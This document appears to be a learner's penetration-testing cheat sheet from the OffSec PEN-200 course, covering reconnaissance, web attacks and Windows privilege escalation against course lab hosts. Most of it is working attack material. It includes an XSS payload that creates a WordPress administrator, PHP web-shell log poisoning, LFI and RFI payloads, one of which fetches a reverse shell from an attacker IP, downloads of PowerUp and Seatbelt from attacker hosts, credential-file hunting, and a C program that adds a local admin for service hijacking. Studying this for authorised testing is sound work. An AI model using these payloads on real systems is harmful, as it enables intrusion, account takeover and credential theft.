Whois enumaration
Whois domainname -h whoisserver

Host command
Host www.megacorpone.com
Host -t mx megacorpone.com
Host -t txt megacorpone.com

DNS Enum
Dnsenum megacorpone.com

Netcat port scan UDP
Nc -nv -u -z - 1 192.168.50.149 120-123

Netcat port scan TCP 
Nc -nvv -w 1 -z 192.168.50.152 3389-3390


Powershell port scan
1..1024 | % {echo ((New-Object Net.Sockets.TcpClient).Connect("192.168.192.151", $_)) "TCP port $_ is open"} 2>$null


dir bruteforce 

gobuster dir -u 192.168.50.20 -w /usr/share/wordlists/dirb/common.txt -t 5

pattern dir bruteforce
/api_name/v1
create pattern file 
{GOBUSTER}/v1
{GOBUSTER}/v2
gobuster dir -u http://192.168.50.16:5002 -w /usr/share/wordlists/dirb/big.txt -p pattern


find the nonce
var ajaxRequest = new XMLHttpRequest();
var requestURL = "/wp-admin/user-new.php";
var nonceRegex = /ser" value="([^"]*?)"/g;
ajaxRequest.open("GET", requestURL, false);
ajaxRequest.send();
var nonceMatch = nonceRegex.exec(ajaxRequest.responseText);
var nonce = nonceMatch[1];

create user with dynamic nonce above code and below code together
var params = "action=createuser&_wpnonce_create-user="+nonce+"&user_login=attacker&email=attacker@offsec.com&pass1=attackerpass&pass2=attackerpass&role=administrator";
ajaxRequest = new XMLHttpRequest();
ajaxRequest.open("POST", requestURL, true);
ajaxRequest.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
ajaxRequest.send(params);

jscompress to create one-liner


below function encodes javascript to escape bad chars
function encode_to_javascript(string) {
            var input = string
            var output = '';
            for(pos = 0; pos < input.length; pos++) {
                output += input.charCodeAt(pos);
                if(pos != (input.length - 1)) {
                    output += ",";
                }
            }
            return output;
        }
        
let encoded = encode_to_javascript('insert_minified_javascript')
console.log(encoded)

*****************
wordpress stored xss privilege escalation @ https://portal.offsec.com/courses/pen-200/books-and-videos/modal/modules/introduction-to-web-application-attacks/cross-site-scripting/privilege-escalation-via-xss

*************
useragent: Mozilla <?php echo system($_GET['cmd']); ?>
http://mountaindesserts.local/meteor/index.php?page=\..\..\..\..\..\..\..\xampp\apache\logs\access.log

*****************
php wrappers LFI
curl http://mountaindesserts.com/meteor/index.php?page=php://filter/convert.base64-encode/resource=admin.php
curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain,<?php%20echo%20system('ls');?>"
curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"
RFI 
curl "http://mountaindesserts.local/meteor/index.php?page=http://192.168.45.236:8080/pentestmonkeyphprev.php


---------------------------------
windows priv esc
The SID string consists of different parts, delimited by "-", and represented by the placeholders "S", "R", "X", and "Y" in the following listing. This representation is the fundamental structure of a SID.
The first part is a literal "S", which indicates that the string is a SID.

"R" stands for revision and is always set to "1", since the overall SID structure continues to be on its initial version.

"X" determines the identifier authority. This is the authority that issues the SID. For example, "5" is the most common value for the identifier authority. It specifies NT Authority and is used for local or domain users and groups.

"Y" represents the sub authorities of the identifier authority. Every SID consists of one or more sub authorities. This part consists of the domain identifier and relative identifier (RID). The domain identifier is the SID of the domain for domain users, the SID of the local machine for local users, and "32" for built-in principals. The RID determines principals such as users or groups.

List of Well known SIDs on local machines
----------------------
S-1-0-0                       Nobody        
S-1-1-0	                      Everybody
S-1-5-11                      Authenticated Users
S-1-5-18                      Local System
S-1-5-domainidentifier-500    Administrator

When first access granted to target system collect following informations as bare minimum
- Username and hostname
- Group memberships of the current user  --->whoami /groups -- Get-LocalUser 
- Existing users and groups  -----> Get-LocalGroup ---Get-LocalGroupMember adminteam
- Operating system, version and architecture ---->systeminfo
- Network information ----->  ipconfig /all -- route print -- netstat -ano
- Installed applications -------> Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname -- Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname -- to see details remove pipe select displayname -- Get-Process NonStandardProcess | Format-List Path
- Running processes ------> Get-Process
However, the listed applications from Listing 15 may not be complete. For example, this could be due to an incomplete or flawed installation process. Therefore, we should always check 32-bit and 64-bit Program Files directories located in C:\. Additionally, we should review the contents of the Downloads directory of our user to find more potential programs.
The output also shows our Netcat connection on port 4444 as well as an RDP connection from 192.168.119.4 on port 3389. This means we are not the only user currently connected to the system. Once we manage to elevate our privileges, we could use Mimikatz and attempt to extract credentials of the user.

if keepass exist password manager
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
searc txt and ini files
Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
search for passwords in different files
Get-ChildItem -Path C:\Users\dave\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue
runas--> runas /user:backupadmin cmd

convertbase64 windows powershell
[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("YmxhaGJsYWg="))

Evil-WinRm
evil-winrm -i 192.168.50.220 -u daveadmin -p "qwertqwertqwert123\!\!"



Powershell History
Get-History
if empty try this 
(Get-PSReadlineOption).HistorySavePath
and cat this. 
4104 event id search for script logging passwords on event viewer -> application -> windows -> powershell -> operational 

iwr -uri http://192.168.45.197/Seatbelt.exe -Outfile seatbelt.exe
----------------------
Service Binary Hijacking
------------------
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
Eğer bir uygulama C:\Windows\System32 altında görünüyorsa servis yüklemiş C:\Uygulama ise kullanıcı yüklemiştir. 
icacls "C:\xampp\apache\bin\httpd.exe" yetkileri verir F-M-RX-R-W
Mysqld.exe XAMMP da her zaman otomatik olarak çalıştırılır. C:\xampp\mysql\bin\mysqld.exe
servis start mode u ne burdan görebilriiz. 
"
#include <stdlib.h>

int main ()
{
  int i;
  
  i = system ("net user dave2 password123! /add");
  i = system ("net localgroup administrators dave2 /add");
  
  return 0;
}
"
x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like 'mysql'}
shutdown /r /t 0
Get-LocalGroupMember administrators
------------- get modifiable paths
cp /usr/share/windows-resources/powersploit/Privesc/PowerUp.ps1 .
iwr -uri http://192.168.119.3/PowerUp.ps1 -Outfile PowerUp.ps1
powershell -ep bypass
. .\PowerUp.ps1
Get-ModifiableServiceFile
AbuseFunction to add the user john Password123! 
bu in this situation you need to stop the service abusefunction and start the service then u will see the user john added. 


--------dll hijack ---
Standard DLL search order on current Windows versions
1. The directory from which the application loaded.
2. The system directory.
3. The 16-bit system directory.
4. The Windows directory. 
5. The current directory.
6. The directories that are listed in the PATH environment variable.

